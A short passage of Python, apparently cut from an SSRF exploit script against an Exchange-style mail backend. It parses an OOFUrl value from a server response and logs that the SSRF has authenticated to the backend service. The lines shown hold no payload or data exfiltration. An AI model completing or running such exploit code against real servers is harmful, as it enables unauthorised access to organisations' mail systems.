            OOFUrl = resp.text.split(&quot;&lt;OOFUrl&gt;&quot;)[1].split(&quot;&lt;/OOFUrl&gt;&quot;)[0]

            logger.info(&quot;[+] \033[32mSuccess!\033[00m: SSRF Authenticated on Backend Service&quot;)
            logger.info(&quot;[+] Got details...&quot;)
